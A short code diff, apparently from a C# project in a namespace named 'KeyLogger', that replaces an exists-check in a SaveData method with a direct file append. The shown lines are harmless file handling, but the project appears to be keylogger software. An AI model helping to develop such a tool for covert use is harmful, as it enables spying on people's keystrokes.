@@ -68,14 +68,7 @@ namespace KeyLogger
 
         public void SaveData(string path, string data)
         {
-            if (!File.Exists(path))
-            {
-                File.WriteAllText(path, data);
-            }
-            else
-            {
-                File.AppendAllText(path, data);
-            }
+            File.AppendAllText(path, data);
         }
 
     }
